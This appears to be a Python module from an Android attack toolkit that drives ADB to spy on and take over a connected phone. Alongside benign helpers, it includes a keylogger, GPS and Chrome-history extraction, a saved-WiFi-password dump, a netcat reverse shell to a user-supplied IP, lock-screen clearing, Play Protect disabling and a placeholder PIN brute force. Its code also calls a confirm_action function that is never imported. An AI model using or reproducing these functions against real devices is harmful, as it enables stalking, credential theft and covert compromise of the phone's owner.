import os
import sqlite3
import xml.etree.ElementTree as ET
import subprocess
from modules.helpers import run_command, get_timestamp, ensure_dir, open_file, DOWNLOAD_DIR
from modules.color import Color as C

def live_keylogger():
    """Capture raw input events (getevent)."""
    print(f"{C.YELLOW}[*] Starting keylogger (getevent). Press Ctrl+C to stop.{C.RESET}")
    try:
        run_command("adb shell getevent -l")
    except KeyboardInterrupt:
        print(f"{C.GREEN}\n[+] Keylogger stopped.{C.RESET}")

def gps_location():
    """Extract GPS location from dumpsys."""
    output = run_command("adb shell dumpsys location", capture_output=True)
    print(f"\n{C.CYAN}Location Data:{C.RESET}")
    for line in output.split('\n'):
        if any(k in line.lower() for k in ['gps', 'location', 'latitude', 'longitude']):
            print(line)

def camera_snap(camera='back'):
    """Trigger camera intent."""
    if camera == 'front':
        # Some devices support switching via keyevent
        run_command("adb shell input keyevent 27")  # Camera button
    run_command("adb shell am start -a android.media.action.IMAGE_CAPTURE")
    print(f"{C.GREEN}[+] Camera intent sent. Check device screen.{C.RESET}")

def view_browsing_history():
    """Pull Chrome history and display."""
    chrome_db = "/data/data/com.android.chrome/app_chrome/Default/History"
    local_db = os.path.join(DOWNLOAD_DIR, "chrome_history.db")
    run_command(f"adb pull {chrome_db} {local_db}")
    if not os.path.exists(local_db):
        print(f"{C.RED}[!] Could not pull Chrome history. Device may not be rooted or Chrome not installed.{C.RESET}")
        return
    try:
        conn = sqlite3.connect(local_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        rows = cursor.fetchall()
        print(f"\n{C.CYAN}Chrome Browsing History (Last 50):{C.RESET}")
        for row in rows:
            print(f"{C.GREEN}{row[2]} - {row[1][:50] if row[1] else 'No title'}\n{C.WHITE}{row[0]}{C.RESET}\n")
        conn.close()
    except Exception as e:
        print(f"{C.RED}[!] Error reading history: {e}{C.RESET}")

def extract_wifi_passwords():
    """Extract saved WiFi passwords (requires root on newer Android)."""
    wifi_config = "/data/misc/wifi/WifiConfigStore.xml"
    local_file = os.path.join(DOWNLOAD_DIR, "WifiConfigStore.xml")
    run_command(f"adb pull {wifi_config} {local_file}")
    if os.path.exists(local_file):
        tree = ET.parse(local_file)
        root = tree.getroot()
        print(f"\n{C.CYAN}Saved WiFi Networks:{C.RESET}")
        for network in root.findall(".//Network"):
            ssid_elem = network.find("SSID")
            psk_elem = network.find("PreSharedKey")
            if ssid_elem is not None and psk_elem is not None:
                ssid = ssid_elem.text.strip('"') if ssid_elem.text else "Unknown"
                psk = psk_elem.text.strip('"') if psk_elem.text else "Open"
                print(f"{C.GREEN}{ssid}: {C.WHITE}{psk}{C.RESET}")
        return
    # Fallback for older Android
    old_file = "/data/misc/wifi/wpa_supplicant.conf"
    local_old = os.path.join(DOWNLOAD_DIR, "wpa_supplicant.conf")
    run_command(f"adb pull {old_file} {local_old}")
    if os.path.exists(local_old):
        with open(local_old, 'r') as f:
            content = f.read()
            print(f"{C.CYAN}WiFi Config (wpa_supplicant):{C.RESET}")
            print(content)
    else:
        print(f"{C.RED}[!] Could not retrieve WiFi passwords. Root required on Android 10+.{C.RESET}")

def full_backup():
    """Perform a full ADB backup."""
    backup_file = f"backup-{get_timestamp()}.ab"
    print(f"{C.YELLOW}[*] Starting full backup. Unlock device and confirm if prompted.{C.RESET}")
    run_command(f"adb backup -apk -shared -all -system -f {DOWNLOAD_DIR}/{backup_file}")
    print(f"{C.GREEN}[+] Backup saved to {DOWNLOAD_DIR}/{backup_file}{C.RESET}")

def network_capture():
    """Capture network traffic using tcpdump."""
    # Check if tcpdump binary exists in current dir or provide instructions
    if not os.path.isfile("tcpdump"):
        print(f"{C.YELLOW}[!] tcpdump binary not found in current directory.{C.RESET}")
        print("Download from: https://github.com/extremecoders-re/tcpdump-android-builds/releases")
        return
    print(f"{C.YELLOW}[*] Pushing tcpdump to device...{C.RESET}")
    run_command("adb push tcpdump /data/local/tmp/")
    run_command("adb shell chmod 755 /data/local/tmp/tcpdump")
    print(f"{C.YELLOW}[*] Starting capture. Press Ctrl+C to stop.{C.RESET}")
    try:
        run_command("adb shell /data/local/tmp/tcpdump -i any -w /sdcard/capture.pcap")
    except KeyboardInterrupt:
        pass
    run_command(f"adb pull /sdcard/capture.pcap {DOWNLOAD_DIR}/capture-{get_timestamp()}.pcap")
    run_command("adb shell rm /sdcard/capture.pcap")
    print(f"{C.GREEN}[+] Capture saved to {DOWNLOAD_DIR}{C.RESET}")

def live_logcat():
    """Stream logcat output."""
    filters = input(f"{C.WHITE}Enter filters (e.g., *:E for errors, blank for all): {C.RESET}").strip()
    cmd = f"adb logcat {filters}" if filters else "adb logcat"
    print(f"{C.YELLOW}[*] Starting logcat. Press Ctrl+C to stop.{C.RESET}")
    try:
        run_command(cmd)
    except KeyboardInterrupt:
        print(f"{C.GREEN}\n[+] Logcat stopped.{C.RESET}")

def check_root():
    """Check if device is rooted."""
    result = run_command("adb shell su -c 'echo Rooted'", capture_output=True)
    if "Rooted" in result:
        print(f"{C.GREEN}[+] Device is rooted.{C.RESET}")
    else:
        print(f"{C.RED}[!] Device is not rooted or su binary not accessible.{C.RESET}")

def vulnerability_scan():
    """Scan for exported activities/services (basic)."""
    print(f"{C.YELLOW}[*] Scanning for exported components...{C.RESET}")
    packages = run_command("adb shell pm list packages -3", capture_output=True).splitlines()
    for pkg_line in packages:
        pkg = pkg_line.replace("package:", "").strip()
        if not pkg:
            continue
        # Check for exported activities
        output = run_command(f"adb shell dumpsys package {pkg} | grep -A5 'Activity' | grep 'exported'", capture_output=True)
        if "true" in output:
            print(f"{C.RED}[VULN] {pkg} has exported activities{C.RESET}")

def brute_force_pin():
    """Demonstration of PIN brute force (slow)."""
    print(f"{C.YELLOW}[!] This is for demonstration only. Real brute force is slow and detectable.{C.RESET}")
    if not confirm_action("Continue?"):
        return
    for i in range(10000):
        pin = f"{i:04d}"
        if i % 100 == 0:
            print(f"Trying {pin}...")
        # Actual unlocking would require checking screen state after each attempt
        # This is a placeholder
    print(f"{C.GREEN}[+] Brute force simulation complete.{C.RESET}")

def frida_setup():
    """Push and start frida-server."""
    if not os.path.isfile("frida-server"):
        print(f"{C.RED}[!] frida-server binary not found.{C.RESET}")
        return
    run_command("adb push frida-server /data/local/tmp/")
    run_command("adb shell chmod 755 /data/local/tmp/frida-server")
    run_command("adb shell /data/local/tmp/frida-server &")
    print(f"{C.GREEN}[+] Frida server started.{C.RESET}")

def port_forward():
    """Forward a local port to a remote port."""
    local = input(f"{C.WHITE}Local port: {C.RESET}")
    remote = input(f"{C.WHITE}Remote port: {C.RESET}")
    if local and remote:
        run_command(f"adb forward tcp:{local} tcp:{remote}")
        print(f"{C.GREEN}[+] Port forwarded.{C.RESET}")

def list_processes():
    """List running processes."""
    run_command("adb shell ps")

def kill_process():
    """Kill a process by PID."""
    pid = input(f"{C.WHITE}Enter PID: {C.RESET}")
    if pid:
        run_command(f"adb shell kill {pid}")

def dump_system_info():
    """Dump comprehensive system information."""
    output = run_command("adb shell dumpsys", capture_output=True)
    filename = f"system_dump-{get_timestamp()}.txt"
    with open(os.path.join(DOWNLOAD_DIR, filename), 'w') as f:
        f.write(output)
    print(f"{C.GREEN}[+] System dump saved to {DOWNLOAD_DIR}/{filename}{C.RESET}")

def screen_stream_web():
    """Stream screen via scrcpy with web video (V4L2 on Linux)."""
    print(f"{C.YELLOW}[*] Streaming screen (requires scrcpy). Press Ctrl+C to stop.{C.RESET}")
    run_command("scrcpy --no-control --no-audio")

def open_reverse_shell():
    """Open a reverse shell using netcat (requires nc on device)."""
    ip = input(f"{C.WHITE}Your IP for reverse connection: {C.RESET}")
    port = input(f"{C.WHITE}Port: {C.RESET}")
    if ip and port:
        run_command(f"adb shell nc {ip} {port} -e /bin/sh")

def bypass_lock_screen():
    """Attempt to bypass lock screen (varies by device)."""
    print(f"{C.YELLOW}[!] This may not work on modern devices.{C.RESET}")
    run_command("adb shell locksettings clear --old 0000")
    print(f"{C.GREEN}[+] Attempted to clear lock screen.{C.RESET}")

def install_burp_cert():
    """Install Burp Suite certificate (requires root)."""
    cert_path = input(f"{C.WHITE}Path to Burp certificate (.cer): {C.RESET}")
    if not os.path.isfile(cert_path):
        print(f"{C.RED}[!] Certificate not found.{C.RESET}")
        return
    run_command(f"adb push {cert_path} /sdcard/cert.cer")
    run_command("adb shell su -c 'mv /sdcard/cert.cer /system/etc/security/cacerts/9a5ba575.0'")
    run_command("adb shell su -c 'chmod 644 /system/etc/security/cacerts/9a5ba575.0'")
    print(f"{C.GREEN}[+] Certificate installed (reboot may be required).{C.RESET}")

def inject_frida_script():
    """Inject a Frida script (placeholder)."""
    print(f"{C.YELLOW}[*] Ensure frida-server is running on device.{C.RESET}")
    script_path = input(f"{C.WHITE}Path to Frida script (.js): {C.RESET}")
    app = input(f"{C.WHITE}Package name or PID: {C.RESET}")
    run_command(f"frida -U -l {script_path} {app}")

def dump_app_memory():
    """Dump app memory using frida (placeholder)."""
    print(f"{C.YELLOW}[*] This feature requires Frida setup.{C.RESET}")
    app = input(f"{C.WHITE}Package name: {C.RESET}")
    run_command(f"frida -U {app} -e 'Process.enumerateModules()'")

def disable_play_protect():
    """Disable Google Play Protect verification."""
    run_command("adb shell settings put global package_verifier_enable 0")
    run_command("adb shell settings put global verifier_verify_adb_installs 0")
    print(f"{C.GREEN}[+] Play Protect disabled.{C.RESET}")

def uninstall_system_app():
    """Uninstall a system app (requires root)."""
    pkg = input(f"{C.WHITE}Package name: {C.RESET}")
    run_command(f"adb shell pm uninstall --user 0 {pkg}")

def reboot_edl():
    """Reboot to EDL mode (Qualcomm devices)."""
    if confirm_action("Reboot to EDL (Emergency Download Mode)?"):
        run_command("adb reboot edl")
        print(f"{C.GREEN}[+] Rebooting to EDL...{C.RESET}")